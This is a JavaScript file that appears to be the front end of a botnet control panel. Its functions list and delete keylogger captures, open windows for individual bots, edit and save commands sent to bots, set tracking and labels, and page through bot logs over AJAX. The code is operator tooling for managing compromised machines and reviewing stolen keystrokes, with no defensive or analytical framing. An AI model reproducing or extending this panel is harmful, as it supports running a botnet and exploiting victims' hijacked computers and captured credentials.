function keylog_list (hash, trash) {
	get_hax({
		url: '/keylog/hash-'+hash+'.html?ajax=1&y='+trash,
		method: 'get',
		id: 'content',
	});
	return false;
}

function keylog_item (str, trash) {
	var str=str.parentNode.id.split('_');
	get_hax({
		url: '/keylog/hash.html?ajax=1&str='+str[1]+'&x=' + str[2] + '&y=' + trash,
		method: 'get',
		id: 'content',
	});
	return false;
}

function item_del(id, hash) {
	get_hax({
		url: '/keylog/item_del-'+id+'.html?str=' + hash,
		method: 'get',
		id: 'content',
	});
	return false;
}

function get_bot_window(str){
	var str=str.parentNode.id.split('_');
	get_window('/bots/bot-'+str[2]+'.html?window=1', {name:'bot'+str[2], widht: 800, height: 600});
	return false;
}

function get_bot_window_u(str){
	get_window('/bots/bot-'+str+'.html?window=1', {name:'bot'+str, widht: 800, height: 600});
	return false;
}

function edit_bot_cmd(obj, uniq){
	if(!document.forms['form'+uniq]){
		myf=document.createElement("form");
		myf.name = 'form'+uniq;
		myf.action = '#';
		
		myt = document.createElement("textarea");
		myt.name = 'cmd'+uniq;
		myt.style.width = '100%';
		myt.value = obj.cells[1].textContent;
		
		myi = document.createElement("input");
		myi.type = 'button';
		myi.value = lang['save'];
		myi.onclick = new Function("e", "save_bot_cmd('"+uniq+"');");
		
		myf.appendChild(myt);
		myf.appendChild(myi);
		
		obj.cells[1].innerHTML = '';
		obj.cells[1].appendChild(myf);
				
		//obj.cells[1].innerHTML = '<form action="#" name="form'+uniq+'"><textarea name="cmd'+uniq+'" style="width:100%;">'+obj.cells[1].textContent+'</textarea><br /><input type="button" value="'+lang['save']+'" onclick="save_bot_cmd('+uniq+');" /></form>';
	}
	return false;
}

function save_bot_cmd(uniq){
	if(checklen(document.forms['form'+uniq].elements['cmd'+uniq], 250) != false){
		get_hax({
			url: '/bots/jobs_bot_edit-'+eval('id_bot_'+uniq)+'.html?ajax=1',
			method: 'post',
			params: 'cmd=' + document.forms['form'+uniq].elements['cmd'+uniq].value,
			id: 'cmdcell' + uniq,
			indicator: '<form action="#" name="form'+uniq+'"><div align="center"><img src="/images/loading.gif" alt="'+lang['load']+'" /></div></form>',
		});
	}
	return false;
}

function edit_comment_b(td, form_name){
	//var id = td.id.replace('cg_', '');
	var id=td.id.split('_');
	if(!comment[id[1] + '' + id[2]]){
		var text = td.innerHTML;
		text = text.replace(/<br>/g, '\n');
		text = text.replace(/<\/?[^>]+>/g, '');
		td.innerHTML = '<textarea name="text_'+id[1] + '_' + id[2]+'" cols="1" rows="1" style="width:99%; height: 60px;" onBlur="save_comment_b(this, '+form_name+');">'+text+'</textarea>';
    	document.forms[form_name].elements['text_' + id[1] + '_' + id[2]].focus();
		comment[id] = true;
    }
}

function save_comment_b(object, form_name){
   // var id = object.name.replace('text_', '');
	var id=object.name.split('_');
	object.name = 'text';
	get_hax({
		url: '/bots/save_comment-'+id[2]+'.html?str='+id[1]+'&ajax=1',
		method: 'post',
		form: form_name,
		id: 'cg_' + id[1] + '_' + id[2],
		onload: function(str){comment[id[1] + '' + id[2]] = false; if(str['html'][0] == ' ') document.getElementById(str['id']).innerHTML = ''; },
		indicator: '<div align="center"><img src="/images/loading.gif" alt="'+lang['load']+'" /></div>',
	});
}

function set_tracking(id, content){
	get_hax({
			url: '/bots/tracking-'+id+'.html?ajax=1&str='+content,
			method: 'get',
			id: content,
			indicator: '<div align="center"><img src="/images/loading.gif" alt="'+lang['load']+'" /></div>',
	});
	return false;
}

function bots_list (url) {
	get_hax({
			url: url + '&ajax=1',
			method: 'get',
			id: 'content',
	});
	return false;
}

function bls(id, label, cid){
	get_hax({
		url: '/bots/bot-'+id+'.html?x=label&y=' + label + '&z=' + cid,
		method: 'get',
		id: cid,
		indicator: '<div align="center"><img src="/images/loading.gif" /></div>',
	});
	return false;
}

function gld(id){
	var dip = id.parentNode.id.split('_');
	var pip = id.href.split('?&page=');
	get_hax({
		url: '/bots/bot.html?id=' + dip[1] + '&x=logs&page=' + pip[1] + '&z=' + dip[2],
		method: 'get',
		id: 'logs' + dip[2],
		indicator: '<div align="center"><img src="/images/loading.gif" /></div>',
	});
	return false;
}


